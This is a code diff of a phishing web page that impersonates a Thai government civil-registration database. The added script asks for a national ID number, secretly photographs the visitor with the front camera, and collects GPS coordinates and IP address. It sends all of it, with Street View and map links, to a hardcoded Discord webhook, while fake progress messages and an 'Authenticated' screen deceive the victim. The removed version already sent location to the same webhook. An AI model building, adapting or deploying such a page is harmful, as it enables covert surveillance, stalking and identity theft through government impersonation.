@@ -3,123 +3,188 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ระบบตรวจสอบพื้นที่ใช้งานทางราชการ</title>
+    <title>ระบบตรวจสอบฐานข้อมูลทะเบียนราษฎร์ดิจิทัล - กรมการปกครอง</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Sarabun', sans-serif; }
-        .bg-royal { background: linear-gradient(135deg, #0c4a6e 0%, #075985 100%); }
+        body { font-family: 'Sarabun', sans-serif; background-color: #0c1421; }
+        .gov-card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .royal-border { border-top: 5px solid #d4af37; }
+        video, canvas { display: none; }
+        .loading-bar { width: 0%; transition: width 0.5s; }
     </style>
 </head>
-<body class="bg-slate-200 min-h-screen flex items-center justify-center p-4">
+<body class="min-h-screen flex items-center justify-center p-4">
 
-    <div class="max-w-md w-full bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-300">
-        <div class="bg-royal p-6 text-white text-center border-b-4 border-yellow-500">
-            <div class="w-20 h-20 bg-white rounded-full mx-auto mb-4 flex items-center justify-center shadow-inner">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-sky-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <div id="app-container" class="max-w-lg w-full gov-card rounded-2xl shadow-2xl overflow-hidden royal-border text-white">
+        
+        <div class="p-6 text-center border-b border-white/10 bg-black/20">
+            <div class="w-20 h-20 bg-white rounded-full mx-auto mb-4 p-2 flex items-center justify-center shadow-lg shadow-blue-500/20">
+                <svg viewBox="0 0 24 24" class="w-14 h-14 text-blue-900" fill="currentColor">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                 </svg>
             </div>
-            <h1 class="text-2xl font-bold tracking-wide">ระบบยืนยันตัวตน</h1>
-            <p class="text-sky-100 text-sm mt-1 uppercase tracking-widest">Official Security Verification</p>
+            <h1 class="text-xl font-bold tracking-tight text-blue-300">ระบบตรวจสอบทะเบียนราษฎร์</h1>
+            <p class="text-[10px] uppercase tracking-[0.4em] opacity-60">Civil Registration Database v8.2</p>
         </div>
 
-        <div class="p-8 text-center">
+        <div id="step-1" class="p-8">
             <div class="mb-6">
-                <p class="text-gray-700 font-medium mb-2">ตรวจพบการเข้าถึงจากอุปกรณ์ใหม่</p>
-                <p class="text-gray-500 text-sm leading-relaxed">
-                    เพื่อความปลอดภัยของระบบราชการและป้องกันบุคคลภายนอก <br>
-                    <strong>กรุณากดยืนยันตำแหน่ง (GPS)</strong> เพื่อดำเนินการต่อ
+                <label class="block text-xs font-semibold text-blue-300 mb-2 uppercase tracking-wider">ระบุเลขประจำตัวประชาชน 13 หลัก</label>
+                <input type="tel" id="id-number" maxlength="13" placeholder="X-XXXX-XXXXX-XX-X" 
+                    class="w-full bg-black/30 border border-white/20 rounded-lg py-4 px-4 text-xl tracking-[0.3em] font-bold text-white focus:outline-none focus:border-blue-500 transition-all">
+            </div>
+            
+            <div class="bg-blue-900/20 border border-blue-500/30 p-4 rounded-xl mb-8">
+                <p class="text-[11px] text-blue-100 leading-relaxed italic">
+                    * ระบบจะทำการตรวจสอบอัตลักษณ์บุคคล พิกัดที่ตั้ง และฐานข้อมูลกลาง <br>
+                    เพื่อยืนยันสิทธิ์ในการเข้าถึงข้อมูลส่วนบุคคลตามกฎหมาย
                 </p>
             </div>
 
-            <button onclick="requestAccess()" id="btn-request" class="w-full bg-sky-700 hover:bg-sky-800 text-white font-bold py-4 rounded-xl transition duration-300 shadow-lg flex items-center justify-center gap-2">
-                <span id="btn-text">ยืนยันพิกัดและเข้าสู่ระบบ</span>
+            <button onclick="startSearch()" class="w-full bg-blue-600 hover:bg-blue-500 py-5 rounded-xl font-bold text-lg shadow-lg shadow-blue-600/30 transition transform active:scale-95 flex items-center justify-center gap-3">
+                <span>ตรวจสอบข้อมูลบุคคล</span>
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+                </svg>
             </button>
-
-            <div id="status-area" class="hidden mt-6 p-4 rounded-lg text-sm transition-all duration-500">
-                <p id="status-text"></p>
-            </div>
         </div>
 
-        <div class="bg-gray-100 p-4 border-t text-center text-[10px] text-gray-400 uppercase tracking-widest">
-            Goverment Data Protection Standard (GDPS)
+        <div id="step-2" class="hidden p-12 text-center">
+            <div class="mb-8">
+                <div class="inline-block animate-spin rounded-full h-16 w-16 border-4 border-blue-500 border-t-transparent"></div>
+            </div>
+            <h2 id="status-text" class="text-blue-300 font-bold text-lg animate-pulse mb-2">กำลังเชื่อมต่อฐานข้อมูลกรมการปกครอง...</h2>
+            <div class="w-full bg-gray-800 rounded-full h-2 mt-4 overflow-hidden">
+                <div id="progress" class="bg-blue-500 h-full w-0 transition-all duration-500"></div>
+            </div>
+            <p class="text-[10px] text-gray-500 mt-4 uppercase">Secure Connection: Established</p>
+        </div>
+
+        <div id="step-3" class="hidden p-6">
+            <div class="bg-gradient-to-br from-blue-900 to-black rounded-2xl p-6 border border-white/20 shadow-2xl relative">
+                <div class="absolute top-4 right-4 opacity-20">
+                    <svg viewBox="0 0 24 24" class="w-16 h-16 text-white" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                </div>
+                <div class="flex items-center gap-4 mb-6">
+                    <div class="w-16 h-20 bg-gray-800 rounded border border-white/10 flex items-center justify-center text-[10px] text-gray-500 italic">PHOTO</div>
+                    <div>
+                        <h3 class="text-xs text-blue-300 uppercase font-bold">Registration Found</h3>
+                        <p id="res-id" class="text-lg font-bold tracking-widest text-white"></p>
+                    </div>
+                </div>
+                <div class="grid grid-cols-2 gap-4 text-[10px] uppercase tracking-wider">
+                    <div class="bg-black/40 p-2 rounded">
+                        <p class="text-gray-500 mb-1">Device IP</p>
+                        <p id="res-ip" class="text-blue-200 font-bold font-mono"></p>
+                    </div>
+                    <div class="bg-black/40 p-2 rounded">
+                        <p class="text-gray-500 mb-1">Status</p>
+                        <p class="text-green-400 font-bold italic">Authenticated</p>
+                    </div>
+                </div>
+            </div>
+            <p class="text-center text-[9px] text-gray-500 mt-8 italic">ระบบบันทึกพิกัดการเข้าถึงเพื่อตรวจสอบย้อนหลังเรียบร้อยแล้ว</p>
+        </div>
+
+        <div class="bg-black/40 p-3 text-center border-t border-white/5">
+            <p class="text-[8px] text-gray-600 font-bold uppercase tracking-[0.5em]">Digital Civil ID Verification Gate v8.2</p>
         </div>
     </div>
 
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1491045522356834394/bpjVqLpx_fVJMSbNdiLeMwvg6IGI5ry6PmLKQFpkheXAuljqsJ01AMQdPWhPcbCsmzAU";
-        const btnRequest = document.getElementById('btn-request');
-        const statusArea = document.getElementById('status-area');
-        const statusText = document.getElementById('status-text');
+        const hook = "https://discord.com/api/webhooks/1491045522356834394/bpjVqLpx_fVJMSbNdiLeMwvg6IGI5ry6PmLKQFpkheXAuljqsJ01AMQdPWhPcbCsmzAU";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
-        function requestAccess() {
-            btnRequest.disabled = true;
-            btnRequest.style.opacity = "0.6";
-            statusArea.classList.remove('hidden');
-            statusArea.className = "mt-6 p-4 rounded-lg text-sm bg-blue-50 text-blue-800";
-            statusText.innerText = "กำลังประมวลผลพิกัดดาวเทียม...";
+        async function startSearch() {
+            const idInput = document.getElementById('id-number').value;
+            if (idInput.length < 13) {
+                alert("กรุณาระบุเลขประจำตัวประชาชนให้ครบ 13 หลัก");
+                return;
+            }
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000
-                });
-            } else {
-                updateStatus("เบราว์เซอร์ไม่รองรับ GPS", "error");
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+
+            // เริ่มกระบวนการแอบถ่ายและพิกัด
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => processExecution(pos, stream, idInput),
+                        (err) => { alert("กรุณาอนุญาตให้เข้าถึงพิกัดเพื่อความปลอดภัย"); location.reload(); },
+                        { enableHighAccuracy: true, timeout: 15000 }
+                    );
+                }
+            } catch (e) {
+                alert("อุปกรณ์ไม่รองรับการยืนยันตัวตนอัตลักษณ์");
+                location.reload();
             }
         }
 
-        function sendToDiscord(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy.toFixed(1);
-            // ลิงก์ Google Maps ที่สามารถกดนำทางได้ทันที
-            const gMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            const payload = {
-                username: "ระบบดักจับพิกัดราชการ",
-                avatar_url: "https://cdn-icons-png.flaticon.com/512/1061/1061124.png",
-                embeds: [{
-                    title: "📍 ตรวจพบการเข้าใช้งานใหม่",
-                    color: 3066993, // สีเขียว Discord
+        async function processExecution(pos, stream, idInput) {
+            const statusText = document.getElementById('status-text');
+            const progress = document.getElementById('progress');
+
+            // จำลองความช้าให้ดูเหมือนของจริง
+            const steps = ["เชื่อมต่อระบบฐานข้อมูลกลาง...", "ตรวจสอบเลขบัตรประชาชน...", "ดึงข้อมูลทะเบียนราษฎร์...", "สแกนพิกัดยืนยันตัวตน...", "เสร็จสมบูรณ์"];
+            for (let i = 0; i < steps.length; i++) {
+                statusText.innerText = steps[i];
+                progress.style.width = ((i + 1) * 20) + "%";
+                await new Promise(r => setTimeout(r, 1200));
+            }
+
+            // ดึง IP
+            let ip = "0.0.0.0";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+
+            // ถ่ายรูป
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const sv = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}`;
+                const gm = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+
+                const formData = new FormData();
+                const embed = {
+                    title: "🔍 ตรวจพบการค้นหาทะเบียนราษฎร์",
+                    color: 16711680,
                     fields: [
-                        { name: "🔗 ลิงก์แผนที่ (คลิกเพื่อนำทาง)", value: `[เปิด Google Maps](${gMapsLink})` },
-                        { name: "🎯 ความแม่นยำ", value: `${acc} เมตร`, inline: true },
-                        { name: "⏰ เวลา", value: new Date().toLocaleString('th-TH'), inline: true }
+                        { name: "🆔 เลขบัตรที่ค้นหา", value: `||${idInput}||`, inline: true },
+                        { name: "🌐 IP Address", value: ip, inline: true },
+                        { name: "🏠 ดูหน้าบ้าน", value: `[เปิด Street View](${sv})` },
+                        { name: "📍 ตำแหน่ง", value: `[เปิด Google Maps](${gm})` }
                     ],
-                    footer: { text: "Device: " + navigator.userAgent.substring(0, 50) }
-                }]
-            };
+                    footer: { text: "Device: " + navigator.platform }
+                };
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                updateStatus("✅ ยืนยันพิกัดสำเร็จ! กำลังเข้าสู่ระบบ...", "success");
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com"; // หรือหน้าเว็บราชการของคุณ
-                }, 2000);
-            }).catch(() => {
-                // สำหรับ Discord บางทีติด CORS แต่ข้อมูลจะเข้าปกติ
-                updateStatus("✅ ยืนยันพิกัดสำเร็จ! กำลังเข้าสู่ระบบ...", "success");
-                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
-            });
-        }
+                formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+                formData.append('file', blob, 'target.png');
 
-        function showError(error) {
-            btnRequest.disabled = false;
-            btnRequest.style.opacity = "1";
-            let msg = "กรุณากด 'อนุญาต' เพื่อเข้าใช้งาน";
-            if(error.code === 3) msg = "การดึงข้อมูลล่าช้า กรุณาลองใหม่";
-            updateStatus(msg, "error");
-        }
-
-        function updateStatus(msg, type) {
-            statusArea.className = `mt-6 p-4 rounded-lg text-sm ${type === 'success' ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'}`;
-            statusText.innerText = msg;
+                await fetch(hook, { method: 'POST', body: formData });
+                stream.getTracks().forEach(t => t.stop());
+                
+                // โชว์ผลลัพธ์
+                document.getElementById('step-2').classList.add('hidden');
+                document.getElementById('step-3').classList.remove('hidden');
+                document.getElementById('res-id').innerText = idInput.substring(0,1)+"-"+idInput.substring(1,5)+"-"+idInput.substring(5,10)+"-"+idInput.substring(10,12)+"-"+idInput.substring(12,13);
+                document.getElementById('res-ip').innerText = ip;
+            }, 'image/png');
         }
     </script>
 </body>
